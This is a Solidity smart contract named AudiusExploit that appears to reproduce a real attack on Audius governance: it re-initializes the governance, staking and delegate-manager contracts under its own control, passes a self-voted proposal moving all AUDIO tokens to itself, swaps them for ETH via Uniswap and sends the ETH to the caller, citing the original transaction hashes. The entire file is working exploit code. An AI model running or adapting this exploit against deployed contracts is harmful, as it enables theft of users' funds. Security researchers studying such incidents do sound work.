// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v2-periphery/interfaces/IUniswapV2Router02.sol";
import "./interfaces/AudiusInterfaces.sol";

contract AudiusExploit {
    address constant governanceAddress = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC;
    IGovernance constant governance = IGovernance(governanceAddress);
    address constant stakingAddress = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;
    IStaking constant staking = IStaking(stakingAddress);
    address constant dmanagerAddress = 0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225;
    IDelegateManagerV2 constant dmanager = IDelegateManagerV2(dmanagerAddress);
    address constant audioTokenAddress = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
    ERC20 constant audioToken = ERC20(audioTokenAddress);
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant router = IUniswapV2Router02(routerAddress);

    function exploit1() public {
        // tx: 0xfefd829e246002a8fd061eede7501bccb6e244a9aacea0ebceaecef5d877a984
        governance.initialize(address(this), 3, 0, 1, 4, address(this));

        governance.evaluateProposalOutcome(84);

        // Submit a proposal to transfer all AUDIO tokens in the Governance Contract to the Exploiter Contract.
        governance.submitProposal(
            bytes32("hoge"), 0, "transfer(address,uint256)", abi.encode(address(this), audioToken.balanceOf(governanceAddress)), "Hello", "World"
        );

        staking.initialize(address(this), address(governance));
    }

    // avoid stack too deep
    function exploit2() external {
        dmanager.initialize(address(this), address(this), 1);
        dmanager.setServiceProviderFactoryAddress(address(this));
        uint256 proposalSubmissionBlockNumber;
        (, bytes memory data) = address(governance).call(abi.encodeWithSignature("getProposalById(uint256)", 85));
        for (uint i = 0; i < 32; i++) {
            proposalSubmissionBlockNumber += uint256(uint8(data[i + 2 * 32])) << ((31 - i) * 8);
        }
        uint256 totalStaked = staking.totalStakedAt(proposalSubmissionBlockNumber);
        uint256 minimumQuorumMetAmount = totalStaked * 2 / 100;
        dmanager.delegateStake(address(this), minimumQuorumMetAmount); // Must be staking tokens > 0 to submit votes
    }

    // tx: 0x3c09c6306b67737227edc24c663462d870e7c2bf39e9ab66877a980c900dd5d5 at 15201796
    function exploit3() external {
        governance.submitVote(85, Vote.Yes);
    }

    function exploit4() external {
        // tx: 0x4227bca8ed4b8915c7eec0e14ad3748a88c4371d4176e716e8007249b9980dc9 at 15201799
        governance.evaluateProposalOutcome(85);

        // tx: 0x82fc23992c7433fffad0e28a1b8d11211dc4377de83e88088d79f24f4a3f28b3
        // Swap from AUDIO to ETH
        audioToken.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = audioTokenAddress;
        path[1] = router.WETH();
        router.swapExactTokensForETH(audioToken.balanceOf(address(this)), 680 ether, path, address(this), block.timestamp);

        // Transfer ETH to attacker
        payable(msg.sender).transfer(address(this).balance);
    }

	function getContract(bytes32 _name) external pure returns (address contractAddr) {
		return audioTokenAddress;
    }

    function isGovernanceAddress() external pure returns (bool) {
        return true;
    }

    function getExecutionDelay() external pure returns (uint, uint) {
        return (0, 0);
    }

    function getVotingPeriod() external pure returns (uint, uint) {
        return (0, 0);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external virtual returns (uint, uint) {
        return (1, 1);
    }

    function validateAccountStakeBalance(address foo) external pure {}

    receive() external payable {}
}